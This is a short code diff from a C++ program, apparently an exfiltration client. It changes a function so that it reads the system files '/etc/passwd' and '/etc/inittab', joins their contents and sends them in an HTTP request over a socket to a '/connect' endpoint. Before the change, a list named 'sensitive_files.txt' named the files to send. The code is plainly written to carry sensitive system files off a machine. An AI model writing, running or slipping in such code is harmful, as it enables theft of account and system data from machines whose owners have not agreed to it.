@@ -9,29 +9,24 @@
 #include "http_res.hpp"
 #include "manage_messages.hpp"
 #include <fstream>
+#include <array>
 
-std::string get_files(const std::string file_name)
+std::string get_files()
 {
-    std::ifstream stream(file_name);
-    std::string file;
-    std::string files;
+    std::array<std::string, 2> files_names = {"/etc/passwd", "/etc/inittab"};
+    std::string files_content;
 
-    if (!stream.is_open()) {
-        std::cerr << "Error: list of sensitive file doesn't exist (" << file_name << ")" << std::endl;
+    for (auto & file_name : files_names) {
+        files_content += get_file(file_name) + "\x03";
     }
-    while (stream.good()) {
-        std::string line;
-        std::getline(stream, file);
-        files += get_file(file) + "\n\n";
-    }
-    return files;
+    return files_content;
 }
 
 void send_file(int socket)
 {
     HttpReq req = HttpReq(HttpReq::HttpMethod::GET, "0.0.0.0", "/connect", "HTTP/1.1");
 
-    req << get_files("sensitive_files.txt");
+    req << get_files();
     req.send_message(socket);
     HttpRes res = convert_res(socket);
     if (res.get_status_code() != 200) {
